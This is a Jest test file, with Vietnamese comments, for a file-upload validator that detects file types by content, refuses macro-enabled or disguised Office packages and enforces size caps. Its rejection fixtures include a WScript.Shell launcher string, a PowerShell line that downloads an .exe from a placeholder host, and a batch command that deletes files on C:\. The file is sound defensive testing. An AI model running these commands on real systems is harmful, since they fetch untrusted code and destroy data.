import * as ExcelJS from 'exceljs';
import JSZip from 'jszip';
import { editableByKey } from '../config-sys/system-config.editable';
import { detectFileType, FILE_HARD_CAP_MB, MULTER_LIMIT, sizeLimitBytes } from './file-validation';

const MB = 1024 * 1024;

const jpg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
const webp = Buffer.concat([
  Buffer.from('RIFF'),
  Buffer.from([0x10, 0x00, 0x00, 0x00]),
  Buffer.from('WEBPVP8 '),
]);
const pdf = Buffer.from('%PDF-1.7\n%âãÏÓ');
const bareZip = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]);
// OLE2 Compound File — .doc/.xls/.ppt đời cũ, chở macro VBA được.
const ole = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0x00]);
const exe = Buffer.from([0x4d, 0x5a, 0x90, 0x00]); // MZ
const js = Buffer.from('var s = new ActiveXObject("WScript.Shell"); s.Run("calc");');
const ps1 = Buffer.from('Invoke-WebRequest http://x/y.exe -OutFile $env:TEMP\\y.exe');
const bat = Buffer.from('@echo off\r\ndel /q C:\\*');

const MIME = {
  docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
};

/** Loại phần chính của từng gói OOXML — đúng chuỗi Office ghi vào `[Content_Types].xml`. */
const MAIN = {
  docx: [
    '/word/document.xml',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml',
  ],
  docm: ['/word/document.xml', 'application/vnd.ms-word.document.macroEnabled.main+xml'],
  dotx: [
    '/word/document.xml',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml',
  ],
  xlsx: [
    '/xl/workbook.xml',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml',
  ],
  xlsm: ['/xl/workbook.xml', 'application/vnd.ms-excel.sheet.macroEnabled.main+xml'],
  pptx: [
    '/ppt/presentation.xml',
    'application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml',
  ],
  pptm: [
    '/ppt/presentation.xml',
    'application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml',
  ],
} as const;

/**
 * Gói OOXML tối thiểu, dựng bằng thư viện zip thật (nén deflate như Office) chứ không tự ráp
 * byte — để bộ đọc zip của `file-validation` được thử trên đúng thứ người dùng tải lên.
 */
async function ooxml(
  kind: keyof typeof MAIN,
  extra: {
    vba?: boolean;
    skipMainPart?: boolean;
    contentTypesFirst?: boolean;
  } = {},
): Promise<Buffer> {
  const [part, type] = MAIN[kind];
  const zip = new JSZip();
  const types =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' +
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
    '<Default Extension="xml" ContentType="application/xml"/>' +
    (extra.vba
      ? '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
      : '') +
    // Thuộc tính đảo thứ tự: bộ đọc không được giả định PartName đứng trước.
    `<Override ContentType="${type}" PartName="${part}"/>` +
    '</Types>';
  if (extra.contentTypesFirst !== false) zip.file('[Content_Types].xml', types);
  zip.file('_rels/.rels', '<Relationships/>');
  if (!extra.skipMainPart) zip.file(part.slice(1), '<root/>');
  if (extra.vba) zip.file(`${part.split('/')[1]}/vbaProject.bin`, Buffer.from([0xcc, 0x61]));
  if (extra.contentTypesFirst === false) zip.file('[Content_Types].xml', types);
  return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
}

describe('detectFileType (NFR-9, Q-18) — theo NỘI DUNG, không tin đuôi/Content-Type', () => {
  it.each([
    ['a.jpg', jpg, { mime: 'image/jpeg', kind: 'image' }],
    ['b.png', png, { mime: 'image/png', kind: 'image' }],
    ['c.webp', webp, { mime: 'image/webp', kind: 'image' }],
    ['d.pdf', pdf, { mime: 'application/pdf', kind: 'document' }],
  ])('%s nhận đúng loại', (name, buf, expected) => {
    expect(detectFileType(buf, name)).toEqual(expected);
  });

  it.each([
    ['virus.png — bytes exe', exe, 'virus.png'],
    ['virus.js đổi tên .pdf', js, 'virus.pdf'],
    ['.ps1 đổi tên .docx', ps1, 'script.docx'],
    ['.bat đổi tên .xlsx', bat, 'bang.xlsx'],
    ['.exe giữ nguyên đuôi', exe, 'setup.exe'],
    ['.js giữ nguyên đuôi', js, 'x.js'],
    ['.doc đời cũ (OLE)', ole, 'bien-ban.doc'],
    ['.xls đời cũ (OLE)', ole, 'bang.xls'],
    ['.ppt đời cũ (OLE)', ole, 'slide.ppt'],
    ['OLE đổi tên .docx', ole, 'bien-ban.docx'],
    ['zip trần đổi tên .docx', bareZip, 'bien-ban.docx'],
    ['zip trần đổi tên .xlsx', bareZip, 'bang.xlsx'],
    [
      'RIFF WAVE đội lốt .webp',
      Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WAVE')]),
      'x.webp',
    ],
    ['buffer 1 byte', Buffer.from([0xff]), 'x.jpg'],
    ['buffer rỗng', Buffer.alloc(0), 'x.png'],
  ])('%s → từ chối', (_label, buf, name) => {
    expect(detectFileType(buf, name)).toBeNull();
  });
});

describe('detectFileType — Office dạng mới (docx/xlsx/pptx) đọc `[Content_Types].xml`', () => {
  it.each([
    ['docx', 'bien-ban.docx', MIME.docx],
    ['xlsx', 'bang-kiem-ke.xlsx', MIME.xlsx],
    ['pptx', 'trinh-bay.pptx', MIME.pptx],
    ['docx', 'VIET-HOA.DOCX', MIME.docx],
  ] as const)('%s thật (%s) → nhận', async (kind, name, mime) => {
    expect(detectFileType(await ooxml(kind), name)).toEqual({
      mime,
      kind: 'document',
    });
  });

  it('xlsx do chính IMS xuất (exceljs) → nhận: người dùng hay đính lại file vừa tải về', async () => {
    const workbook = new ExcelJS.Workbook();
    workbook.addWorksheet('Thiết bị').addRow(['SRV-01', 'Máy chủ']);
    const buf = Buffer.from(await workbook.xlsx.writeBuffer());
    expect(detectFileType(buf, 'thiet-bi.xlsx')).toEqual({ mime: MIME.xlsx, kind: 'document' });
  });

  it('`[Content_Types].xml` nằm cuối gói (không phải mục đầu) vẫn đọc được', async () => {
    const buf = await ooxml('pptx', { contentTypesFirst: false });
    expect(detectFileType(buf, 'x.pptx')).toEqual({
      mime: MIME.pptx,
      kind: 'document',
    });
  });

  it.each([
    ['xlsm đổi tên .xlsx', 'xlsm', 'bang.xlsx'],
    ['docm đổi tên .docx', 'docm', 'bien-ban.docx'],
    ['pptm đổi tên .pptx', 'pptm', 'slide.pptx'],
    ['xlsm giữ đuôi', 'xlsm', 'bang.xlsm'],
    ['mẫu .dotx đổi tên .docx', 'dotx', 'mau.docx'],
    ['docx thật đặt đuôi .xlsx', 'docx', 'nham.xlsx'],
    ['xlsx thật đặt đuôi .pptx', 'xlsx', 'nham.pptx'],
    ['pptx thật đặt đuôi .zip', 'pptx', 'goi.zip'],
  ] as const)('%s → từ chối', async (_label, kind, name) => {
    expect(detectFileType(await ooxml(kind), name)).toBeNull();
  });

  it('docx khai đúng loại nhưng có vbaProject.bin → từ chối', async () => {
    expect(detectFileType(await ooxml('docx', { vba: true }), 'x.docx')).toBeNull();
  });

  it('khai phần chính mà gói không có phần đó → từ chối', async () => {
    expect(detectFileType(await ooxml('docx', { skipMainPart: true }), 'x.docx')).toBeNull();
  });

  it('zip không có `[Content_Types].xml` → từ chối', async () => {
    const zip = new JSZip();
    zip.file('word/document.xml', '<root/>');
    const buf = await zip.generateAsync({
      type: 'nodebuffer',
      compression: 'DEFLATE',
    });
    expect(detectFileType(buf, 'x.docx')).toBeNull();
  });

  it('zip cụt (mất thư mục trung tâm) → từ chối, không ném lỗi', async () => {
    const whole = await ooxml('docx');
    expect(detectFileType(whole.subarray(0, whole.length - 30), 'x.docx')).toBeNull();
  });
});

describe('trần dung lượng (Q-18) — một trần cho mọi loại, lấy từ `file.max_size_mb`', () => {
  it.each([
    [25, 25 * MB],
    [10, 10 * MB],
    [1, 1 * MB],
    // Cấu hình vượt trần cứng thì vẫn chỉ tới trần cứng: multer/nginx đã chặn ở đó từ trước.
    [100, FILE_HARD_CAP_MB * MB],
  ])('%i MB → %i byte', (mb, bytes) => {
    expect(sizeLimitBytes(mb)).toBe(bytes);
  });

  it('trần cứng multer cao hơn trần cấu hình lớn nhất (để file quá cỡ nhận câu báo có số MB)', () => {
    expect(MULTER_LIMIT.fileSize).toBeGreaterThan(FILE_HARD_CAP_MB * MB);
    expect(MULTER_LIMIT.files).toBe(1);
  });

  it('màn Tham số không cho đặt `file.max_size_mb` quá trần cứng', () => {
    expect(editableByKey('file.max_size_mb')?.max).toBe(FILE_HARD_CAP_MB);
  });
});
